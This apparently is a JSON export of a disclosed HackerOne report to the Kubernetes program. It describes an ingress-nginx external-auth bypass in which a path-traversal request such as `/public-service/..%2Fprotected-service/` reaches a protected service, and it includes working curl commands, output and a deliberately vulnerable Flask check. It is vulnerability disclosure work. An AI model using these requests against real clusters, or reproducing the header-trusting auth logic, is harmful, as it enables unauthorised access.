@@ -1,0 +1,1614 @@
+{
+    "id": 1357948,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzU3OTQ4",
+    "url": "https://hackerone.com/reports/1357948",
+    "title": "Attacker can bypass authentication build on ingress external auth (`nginx.ingress.kubernetes.io/auth-url`)",
+    "state": "Closed",
+    "substate": "informative",
+    "severity_rating": "medium",
+    "readable_substate": "Informative",
+    "created_at": "2021-10-03T19:44:41.492Z",
+    "submitted_at": "2021-10-03T19:44:41.551Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "thisbug",
+        "url": "/thisbug",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 39386,
+        "url": "https://hackerone.com/kubernetes",
+        "handle": "kubernetes",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Kubernetes",
+            "twitter_handle": "kubernetesio",
+            "website": "https://kubernetes.io/",
+            "about": ""
+        }
+    },
+    "has_bounty?": true,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2022-04-23T07:07:08.925Z",
+    "bug_reporter_agreed_on_going_public_at": "2022-04-23T07:07:08.756Z",
+    "team_member_agreed_on_going_public_at": "2022-04-22T16:59:11.914Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "Report Submission Form\n\n## Summary:\nSending request with `<public-service>..%2F<protected-service>` allows to manipulate headers:\n\n* X-Original-Url\n* X-Auth-Request-Redirect\n\ndue to that manipulation external auth service could make wrong decision and return 204 instead of 401/403. **To be clear: manipulation of those headers give no possibility to kubernetes user to make any proper decisions based on those headers. ** This way allowing anonymous access to public service and trying to protect access to protected-service by e.g. api-key is not possible.\n\n{F1469913}\n\nExample:\nWith this call `curl -v http://app.test/public-service/..%2Fprotected-service/protected` external auth configured on ingress using `nginx.ingress.kubernetes.io/auth-url: http://auth-service.default.svc.cluster.local:8080/verify` will get following headers:\n```\nX-Request-Id: 7d979c82ca55141ed0d58655fbaac586\nHost: auth-service.default.svc.cluster.local\nX-Original-Url: http://app.test/public-service/..%2Fprotected-service/protected\nX-Original-Method: GET\nX-Sent-From: nginx-ingress-controller\nX-Real-Ip: 192.168.99.1\nX-Forwarded-For: 192.168.99.1\nX-Auth-Request-Redirect: /public-service/..%2Fprotected-service/protected\nConnection: close\nUser-Agent: curl/7.75.0\nAccept: */*\n```\nBoth headers `X-Original-Url` and `X-Auth-Request-Redirect` are manipulated. \n\nHow this auth-service can parse request? Here is simple example of python and Flask:\n```\napi_key = request.headers.get('X-Api-Key')\nrequest_redirect = request.headers.get('X-Auth-Request-Redirect')\n\nif request_redirect and request_redirect.startswith(\"/public-service/\"):\n    return Response(status = HTTPStatus.NO_CONTENT)\n\nif api_key == \"secret-api-key\":  \n    return Response(status = HTTPStatus.NO_CONTENT)\n\nreturn Response(status = HTTPStatus.UNAUTHORIZED)\n```\n\n## Kubernetes Version:\nminikube v1.23.2 on Microsoft Windows 10 Pro 10.0.19043 Build 19043\nKubernetesa v1.22.2 on Docker 20.10.8\n\n## Component Version:\nk8s.gcr.io/ingress-nginx/controller:v1.0.0-beta.3@sha256:44a7a06b71187a4529b0a9edee5cc22bdf71b414470eff696c3869ea8d90a695\n\n## Steps To Reproduce:\n\n  1. Download project in attachment: F1469916\n  2. Install minikube\n  3. Enable addon ingress and ingress-dns\n  4. Build docker images:\n\n    * `cd auth-service; docker build -t auth-service:0.0.4 .`\n    * `cd protected-service; docker build -t protected-service:0.0.1 .`\n    * `cd public-service; docker build -t public-service:0.0.1 .`\n\n  5. push docker images into minikube:\n\n    * `minikube image load auth-service:0.0.4`\n    * `minikube image load protected-service:0.0.1`\n    * `minikube image load public-service:0.0.1`\n\n  6. apply kubernetes configuration: `kubectl apply -f app.yaml`\n\nTo access public service: `curl -v http://app.test/public-service/public`\nTo access protected service: `curl -v http://app.test/protected-service/protected -H \"X-Api-Key: secret-api-key\"`\nTo access protected service bypassing authentication: `curl -v http://app.test/public-service/..%2Fprotected-service/protected`\n\n## Supporting Material/References:\n\n  * in F1469916 - project consist of 2 services: public and protected. Access to public should be available for anyone and to protected only with `X-Api-Key` header. auth-service is protecting access and configured as external auth on ingress.\n    * app.yaml - whole configuration\n    * auth-service, protected-service, public-service - directories with Dockerfiles to build\n\n## Additional note\nAt first I have found this vulnerability in old version of ingress-nginx. It was 0.70.0. With this old version bypass was working without encoding of / to %2F.\ne.g. `curl -v http://app.test/public-service/../protected-service/protected`\nI was not able to reproduce it locally with minikube (couldn't install old ingress addon), but there is possibility that for some older versions of ingress-nginx you don't need to encode / to %2F.\n\n## Impact\n\nAttacker can bypass authentication build on ingress external auth (`nginx.ingress.kubernetes.io/auth-url`). \n\nAttacker can manipulate `X-Original-Url` and `X-Auth-Request-Redirect` headers. Due to this kubernetes user is not able to make safe assumption on those headers.",
+    "weakness": {
+        "id": 27,
+        "name": "Improper Authentication - Generic"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 1469913,
+            "file_name": "h1-1.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7k2im7rwxmyd0idnqrg1dd0a36q1?response-content-disposition=attachment%3B%20filename%3D%22h1-1.png%22%3B%20filename%2A%3DUTF-8%27%27h1-1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070215Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=da6e00c914b92c9ffc1fcb0f7dd0a79ed5c365fb3d2f3dbaca2ca910c508dedb",
+            "file_size": 27259,
+            "type": "image/png"
+        },
+        {
+            "id": 1469916,
+            "file_name": "k8s-ingress-auth-bypass.zip",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2ippwb4ryh6c7u8ubfau3o9tbolk?response-content-disposition=attachment%3B%20filename%3D%22k8s-ingress-auth-bypass.zip%22%3B%20filename%2A%3DUTF-8%27%27k8s-ingress-auth-bypass.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070215Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ec5ea3bb590936e28bbc21f933a5193c733a54a759364ebb619e111564036a37",
+            "file_size": 5876,
+            "type": "application/zip"
+        }
+    ],
+    "allow_singular_disclosure_at": null,
+    "vote_count": 12,
+    "voters": [
+        "rondons",
+        "p4n7h3rx",
+        "alp",
+        "awararesearcher",
+        "zy9ard3",
+        "h4x0r_dz",
+        "shivammusic",
+        "iqrah0x01",
+        "csdpl",
+        "moelwinhtun9",
+        "and 2 more..."
+    ],
+    "severity": {
+        "rating": "medium",
+        "score": 6.5,
+        "author_type": "Team",
+        "metrics": {
+            "attack_vector": "network",
+            "attack_complexity": "low",
+            "privileges_required": "none",
+            "user_interaction": "none",
+            "scope": "unchanged",
+            "confidentiality": "low",
+            "integrity": "low",
+            "availability": "none"
+        }
+    },
+    "structured_scope": {
+        "databaseId": 32524,
+        "asset_type": "SOURCE_CODE",
+        "asset_identifier": "https://github.com/kubernetes/ingress-nginx",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 13806284,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi. Is there anything I can help with ?",
+            "automated_response": false,
+            "created_at": "2021-10-08T05:22:50.001Z",
+            "updated_at": "2021-10-08T05:22:50.001Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 13807416,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNeedsMoreInfo",
+            "message": "Hello @thisbug and thanks for your report,\n\nYes, you can help.\n\nHow do I do this? \n\n> Enable addon ingress and ingress-dns\n\nWhen I run `minikube start --addons ingress-dns ingress --vm=true` this is the error it gives\n\n\n```\nDue to networking limitations of driver docker on darwin, ingress-dns addon is not supported.\nAlternatively to use this addon you can use a vm-based driver:\n\n\t'minikube start --vm=true'\n```\n\nBest regards,\n@turtle_shell l",
+            "automated_response": false,
+            "created_at": "2021-10-08T07:38:27.486Z",
+            "updated_at": "2021-10-08T07:38:27.486Z",
+            "actor": {
+                "username": "h1_analyst_caesar",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_caesar",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/2bkb69nvrwhkybw7m3gi9o2dumgp/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 13807821,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNew",
+            "message": "Hi.\n\nIngress-dns addon is not necessary. It's helper to get smooth dns resolution.\n\nI was doing this on windows, and using virtualbox driver https://minikube.sigs.k8s.io/docs/drivers/virtualbox/ \nUsing docker driver on windows I was not able to turn on ingress addon (don't mean ingress-dns, but normal ingress).\n\nHope that help",
+            "automated_response": false,
+            "created_at": "2021-10-08T08:22:05.795Z",
+            "updated_at": "2021-10-08T08:22:05.795Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 13809124,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Added video with demo: F1475153",
+            "automated_response": false,
+            "created_at": "2021-10-08T09:17:50.849Z",
+            "updated_at": "2021-10-08T09:17:50.849Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 1475153,
+                    "filename": "2021-10-08-11-00-55.7z",
+                    "type": "application/x-7z-compressed",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/a85v56c4flw6d9ldcxzpvddxw7dd?response-content-disposition=attachment%3B%20filename%3D%222021-10-08-11-00-55.7z%22%3B%20filename%2A%3DUTF-8%27%272021-10-08-11-00-55.7z&response-content-type=application%2Fx-7z-compressed&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070215Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=41abcdd85396bff1c1fbdcccf908b757c11a50cba9fe9e308b44fa56e4de7149"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 13819088,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "# ingress-dns\n\nMore about your ingress-dns problem. So ingress-dns is not needed but you need to add `app.test` to your `/etc/hosts` file:\n```\nminikube start\nminikube addons enable ingress\nminikube ip\n```\ntake this ip and add it to `/etc/hosts`:\n```\n<minikube ip> app.test\n```\n\n# run on windows with virtualbox driver\n\nI think, that Windows is not necessary to reproduce this vulnerability.\n\nOn Windows I'm using virtualbox driver, because I couldn't get working default (docker driver) with ingress. On MaOS it can be different.\nSo on Windows I'm doing following steps:\n```\nminikube start --driver=virtualbox --no-vtx-check\nminikube addons enable ingress\nminikube addons enable ingress-dns\nGet-DnsClientNrptRule | Where-Object {$_.Namespace -eq '.test'} | Remove-DnsClientNrptRule -Force; Add-DnsClientNrptRule -Namespace \".test\" -NameServers \"$(minikube ip)\"\n```\n\n# on more curl trick\n\nIt turn out that trick with `../` is working same way as `..%2F` but I needed to add `--path-as-is` to curl\n\n```\n$ curl --path-as-is -v http://app.test/public-service/../protected-service/protected\n*   Trying 192.168.99.109:80...\n* Connected to app.test (192.168.99.109) port 80 (#0)\n> GET /public-service/../protected-service/protected HTTP/1.1\n> Host: app.test\n> User-Agent: curl/7.75.0\n> Accept: */*\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 200 OK\n< Date: Fri, 08 Oct 2021 19:48:10 GMT\n< Content-Type: application/json\n< Content-Length: 26\n< Connection: keep-alive\n<\n{\"data\":\"protected data\"}\n* Connection #0 to host app.test left intact\n```\n\n",
+            "automated_response": false,
+            "created_at": "2021-10-08T19:53:20.797Z",
+            "updated_at": "2021-10-08T19:53:20.797Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 13845608,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@turtle_shell: Do you need any more help with reproducing this bug ?\n",
+            "automated_response": false,
+            "created_at": "2021-10-11T10:40:30.555Z",
+            "updated_at": "2021-10-11T10:40:30.555Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 13848262,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Mitigation\n=====================\n\nIn short: `X-Auth-Request-Redirect` and/or `X-Original-Url` should be canonize same way as request path is canonize in ingress. Also those headers should be documents in kubernetes docs as users are making authentication/authorization decisions based on them.\n\n### Details\n| Request|      Ingress path|  X-Original-Url| X-Auth-Request-Redirect| Description |\n|----------|-------------|------|------|-------|\n| public-service/public |  public-service/ | http://app.test/public-service/public  | /public-service/public | Ingress path matching request and headers -> fine\n| /public-service/../protected-service/protected |    protected-service/ |   http://app.test/public-service/../protected-service/protected | /public-service/../protected-service/protected | Request was canonize and decision was made to pass it to `protected-service/` but headers are not canonize. Why there is no 404 response ? There is no ingress path for `/public-service/../protected-service`",
+            "automated_response": false,
+            "created_at": "2021-10-11T13:10:51.196Z",
+            "updated_at": "2021-10-11T13:10:51.196Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 13899795,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I did hear from you for some time. Do you need any assistance for reproducing this bug ?\n",
+            "automated_response": false,
+            "created_at": "2021-10-14T13:00:05.566Z",
+            "updated_at": "2021-10-14T13:00:05.566Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 13910903,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNeedsMoreInfo",
+            "message": "Hello @thisbug and thanks for your report,\n\n```console\n% kubectl apply -f app.yaml\nerror: You must be logged in to the server (the server has asked for the client to provide credentials)\n```\n\nDo you know why?\n\nBest regards,\n@turtle_shell",
+            "automated_response": false,
+            "created_at": "2021-10-15T09:55:28.209Z",
+            "updated_at": "2021-10-15T09:55:28.209Z",
+            "actor": {
+                "username": "h1_analyst_caesar",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_caesar",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/2bkb69nvrwhkybw7m3gi9o2dumgp/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 13911283,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNew",
+            "message": "This is some kind of problem with credentials to minikube.\nCan you get list of pods ?\n\nTry to use:\n```\nminikube kubectl -- get pods\n```\nand maybe later:\n```\nminikube kubectl -- apply -f app.yaml\n```",
+            "automated_response": false,
+            "created_at": "2021-10-15T10:14:18.690Z",
+            "updated_at": "2021-10-15T10:14:18.690Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 13914936,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Basically, be sure that your minikube cluster is operational, e.g. you can get pods and deploy to it. After that you can apply app.yaml",
+            "automated_response": false,
+            "created_at": "2021-10-15T13:08:44.436Z",
+            "updated_at": "2021-10-15T13:08:44.436Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 13979034,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Do you need any assistance for reproducing this bug ? Did you manage to run minikube fully operational ?",
+            "automated_response": false,
+            "created_at": "2021-10-20T12:08:08.670Z",
+            "updated_at": "2021-10-20T12:08:08.670Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
